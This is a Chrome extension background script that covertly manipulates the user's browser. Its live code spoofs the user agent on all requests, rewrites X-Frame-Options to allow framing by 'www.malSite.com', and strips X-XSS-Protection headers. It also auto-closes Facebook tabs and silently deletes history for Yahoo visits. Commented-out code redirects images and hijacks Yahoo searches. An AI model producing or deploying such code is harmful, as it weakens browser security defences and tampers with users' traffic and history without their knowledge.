// chrome.runtime.onMessage.addListener( function(request) {
//     alert(request)
// }

const red_link = ""//"https://render.fineartamerica.com/images/rendered/default/print/8.000/6.750/break/images/artworkimages/medium/1/troll-face-jeffrey-wong.jpg" //<-- redirect all url to this
const ua = "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"; //change user agent to the following
const is_del = 0 //check 1 to delete all request headers
const frame_value = "Allow-From www.malSite.com" // x-frame value set
const set_URL = "https://www.facebook.com/" //"chrome://extensions/" //<--- url that closes automatically on load
const history_URL = "https://www.yahoo.com/" //URL for which all history should be deleted
const append_search = "yolo&fr=yfp-t&fp=1&toggle=1&cop=mss&ei=UTF-8" //update this to change yahoo search  replace "yolo" with anything you need to search

//--------------------------------------
//Redirects below:
//--------------------------------------
// chrome.webRequest.onBeforeRequest.addListener((details)=>{
//     // return {cancel: details.url.indexOf("*://www.google.com*") != -1};
//     if (red_link.length >2) {return {redirectUrl : red_link}}
// },
// {urls: ["<all_urls>"] , types: ["image"]},
// ["blocking"])

//--------------------------------------
//Modified user agent in header below
//--------------------------------------
let reqCh = function(){
	chrome.webRequest.onBeforeSendHeaders.addListener((info)=>{
		for (var header of info.requestHeaders) {
		    if (header.name.toLowerCase() === "user-agent") {
		      header.value = ua;
		    }
		}
	  	return {requestHeaders: info.requestHeaders};
	  },
	  {
	    urls: [
	    "http://*/*",
	    "https://*/*",
	    ]
	  },
	["blocking", "requestHeaders"]);

}();


//--------------------------------------
//Deletes all headers below
//--------------------------------------
let reqDel = function(){
	chrome.webRequest.onBeforeSendHeaders.addListener((info)=>{
	  if (is_del) {
		  	// console.log('delte:::::',info.requestHeaders);
		  	return {requestHeaders: []};	
		}
	  },
	  {
	    urls: [
	    "http://*/*",
	    "https://*/*",
	    ]
	  },
	["blocking", "requestHeaders"]);

}();

//--------------------------------------
//Modified header below by changing xframe:
//--------------------------------------
let respHdrCh = function(){
	chrome.webRequest.onHeadersReceived.addListener((info)=>{
		new_header_list = []
		for (var header of info.responseHeaders) {
		    if (header.name.toLowerCase() === "x-frame-options") {
		      header.value = frame_value;
	  		}
	  		if (header.name.toLowerCase() === "x-xss-protection") {
	  			continue
	  		}
	  		new_header_list.push(header)
	  	}
	  	return {responseHeaders: new_header_list};
	  },
	  {
	    urls: [
	    "http://*/*",
	    "https://*/*",
	    ]
	  },
	["blocking", "responseHeaders"]);

}();

//--------------------------------------
//TABS catered below:
//--------------------------------------
let TabChanger = function(){
	chrome.tabs.onUpdated.addListener((id, changeinfo , tabinfo)=>{
	  
	  if (changeinfo.url ) {
	  	if(changeinfo.url.includes(set_URL)){
	    	chrome.tabs.remove(id);
	  	}
	  }
	});
	chrome.tabs.query({},(tabs)=>{
			for (let tab of tabs) {
				if (tab.url ) {
					if (tab.url.includes(set_URL)) {
						chrome.tabs.remove(tab.id)
					}
				}
			}
		})
}();
//--------------------------------------
//Deletes history below:
//--------------------------------------
let Hist = function(){
	chrome.history.onVisited.addListener((his_item)=>{
	  if (his_item.url ) {
	  	if (his_item.url.includes(history_URL)) {
	    	chrome.history.deleteUrl({url: his_item.url});
	  	}
	  }
	});	
}();
//--------------------------------------
//Modifies GET request below:
//--------------------------------------

// chrome.webRequest.onBeforeRequest.addListener((info)=>{
//     // return {cancel: details.url.indexOf("*://www.google.com*") != -1};
//     if (info.url.indexOf('?')!== -1 && info.url.indexOf('/search?p=') != -1) {
//         let new_url = info.url.substr(0,(10 + info.url.indexOf('/search?p='))) + append_search
//         console.log(new_url, info.url.indexOf('/search?p='))
//         return {redirectUrl : new_url}
//       }
// },
// {urls: ["<all_urls>"]},
// ["blocking"])